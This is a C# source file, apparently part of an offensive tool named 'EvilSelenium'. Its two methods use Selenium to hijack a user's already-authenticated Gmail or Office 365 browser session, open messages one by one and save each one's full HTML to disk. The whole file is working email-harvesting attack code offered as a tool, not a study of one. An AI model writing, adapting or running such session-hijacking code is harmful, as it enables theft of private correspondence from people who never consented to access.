using System;
using OpenQA.Selenium;
using System.Threading;
using System.IO;


namespace EvilSelenium.Misc
{
    class ExtractMail
    {
        public static void GmailReader(string saveToPath, string numOfEmails)
        {
            int emailCount = 0;
            // parse num of emails
            try
            {
                emailCount = Int32.Parse(numOfEmails);
            }catch(FormatException ex)
            {
                Console.WriteLine("[-] Please enter a valid number of emails");
                System.Environment.Exit(-1);
            }

            // Validate path
            string outPath = Helpers.VerifyPath(saveToPath);

            const string GMAIL = "https://mail.google.com";
            const string AUTHELEMENT = "gb"; // This element ID is found for authenticated users only

            if (Helpers.IsUserAuth(GMAIL, AUTHELEMENT)) 
            {
                Console.WriteLine("[+] User is authenticated to Gmail");
                IWebDriver driver = Helpers.InitDriver();
                driver.Navigate().GoToUrl(GMAIL);
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

                // Grabs the last tbody element
                var tbodyElements = driver.FindElements(By.TagName("tbody"));
                var emailsTbody = tbodyElements[tbodyElements.Count - 1];

                // Verify that emailsTbody has multiple child elements
                // This is a fail safe to ensure we didn't pick the wrong tbody element
                // This introduces an issue that if the user has less than 5 emails
                // The program will assume there's no emails
                var childElems = emailsTbody.FindElements(By.TagName("tr"));

                Console.WriteLine("[+] Fetching " + emailCount + " emails");

                // Otherwise, start grabbing the emails
                for (int i = 0; i < emailCount; i++)
                {
                    try
                    {
                        childElems[i].Click();
                    } 
                    catch(ArgumentOutOfRangeException ex)
                    {
                        Console.WriteLine("[+] No more emails");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }
                    catch (IndexOutOfRangeException ex)
                    {
                        Console.WriteLine("[+] No more emails");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }
                    IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                    string emailContent = (string)js.ExecuteScript("return document.body.innerHTML");
                    File.WriteAllText(outPath + @"\email" + i + ".html", emailContent);
                    driver.Navigate().Back();
                }

                Console.WriteLine("[+] Wrote emails to: " + outPath);

                driver.Quit();
            }
            else
            {
                Console.WriteLine("[-] User is not authenticated");
                System.Environment.Exit(-1);
            }
        }

        public static void O365Reader(string saveToPath,string numOfEmails, string website)
        {
            int emailCount = 0;

            // Cast numOfEmails
            try
            {
                emailCount = Int32.Parse(numOfEmails);
            }catch(FormatException ex)
            {
                Console.WriteLine("[-] Please enter a valid number of emails");
                System.Environment.Exit(-1);
            }

            // Validate path
            string outPath = Helpers.VerifyPath(saveToPath);

            const string AUTHELEMENT = "app"; // This element ID is found for authenticated users only

            if (Helpers.IsUserAuth(website, AUTHELEMENT))
            {
                Console.WriteLine("[+] User is authenticated to O365");
                IWebDriver driver = Helpers.InitDriver();
                driver.Navigate().GoToUrl(website);
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

                driver.FindElement(By.CssSelector("body")).Click();
                driver.FindElement(By.CssSelector("body")).SendKeys(Keys.Control + Keys.End);
                Thread.Sleep(3000);
                var emailCollection = driver.FindElements(By.CssSelector("div[role=\"option\""));
                int emailsCount = emailCount;

                Console.WriteLine("[+] Fetching " + emailCount + " emails");

                for (int i = 0; i < emailsCount; i++)
                {
                    try
                    {
                        emailCollection[i].Click();
                    }
                    catch (ArgumentOutOfRangeException ex)
                    {
                        Console.WriteLine("[!] No more emails");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }
                    catch (IndexOutOfRangeException ex)
                    {
                        Console.WriteLine("[!] No more emails");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }

                    IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                    string emailContent = (string)js.ExecuteScript("return document.body.innerHTML");
                    File.WriteAllText(outPath + @"\email" + i + ".html", emailContent);
                    driver.Navigate().Back();
                }
                
                Console.WriteLine("[+] Wrote emails to: " + outPath);

                driver.Quit();
            }
            else
            {
                Console.WriteLine("[-] User is not authenticated");
                System.Environment.Exit(-1);
            }

            

        }
    }
}
